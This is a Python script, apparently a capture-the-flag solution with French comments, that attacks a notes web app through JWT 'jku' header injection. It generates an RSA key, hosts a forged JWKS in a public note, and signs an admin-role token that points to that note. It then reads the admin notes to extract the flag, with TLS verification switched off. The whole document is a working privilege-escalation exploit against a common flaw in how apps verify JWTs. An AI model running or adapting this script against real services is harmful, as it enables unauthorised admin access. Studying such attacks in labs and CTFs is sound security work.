#!/usr/bin/env python3
# admin-note : injection jku (JWT RS256). Flag NCTF{31315d816bdf5bacf7cc54c1}
# Pré-requis : un cookie session+token member valide (login). Adapter H et cookies.
import json, time, base64, re, requests, jwt, urllib3
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
urllib3.disable_warnings()

H = 'https://<instance>.t.ctf.tg'          # instance du jour
SESSION = '<cookie flask session>'          # obtenu via /login
TOKEN   = '<cookie token member>'           # JWT member courant

s = requests.Session(); s.verify = False
s.cookies.set('session', SESSION); s.cookies.set('token', TOKEN)
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()

# 1) paire RSA + JWKS
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pn = priv.public_key().public_numbers()
n = pn.n.to_bytes((pn.n.bit_length()+7)//8, 'big')
e = pn.e.to_bytes((pn.e.bit_length()+7)//8, 'big')
KID = 'pwn'
jwks = json.dumps({"keys":[{"kty":"RSA","alg":"RS256","use":"sig","kid":KID,
                            "n":b64u(n),"e":b64u(e)}]})
pem = priv.private_bytes(serialization.Encoding.PEM,
                         serialization.PrivateFormat.PKCS8,
                         serialization.NoEncryption())

# 2) héberger le JWKS dans une note PUBLIQUE
r = s.post(H+'/notes/new', data={'title':'k','content':jwks,'is_public':'on'},
           allow_redirects=False)
nid = r.headers['Location'].rsplit('/',1)[-1]
jku = '/notes/%s/raw' % nid                 # chemin RELATIF obligatoire

# 3) forger un token role=admin signé avec notre clé privée
claims = jwt.decode(TOKEN, options={'verify_signature': False})
claims.update(role='admin', iat=int(time.time()), exp=int(time.time())+3600)
forged = jwt.encode(claims, pem, algorithm='RS256',
                    headers={'jku':jku, 'kid':KID, 'typ':'JWT'})

# 4) accès admin -> flag
c = {'session': SESSION, 'token': forged}
admin = requests.get(H+'/admin', cookies=c, verify=False).text
for i in set(re.findall(r'/notes/([0-9a-f-]{36})', admin)):
    body = requests.get(H+'/notes/%s/raw' % i, cookies=c, verify=False).text
    m = re.search(r'NCTF\{[^}]+\}', body)
    if m:
        print('FLAG:', m.group(0))
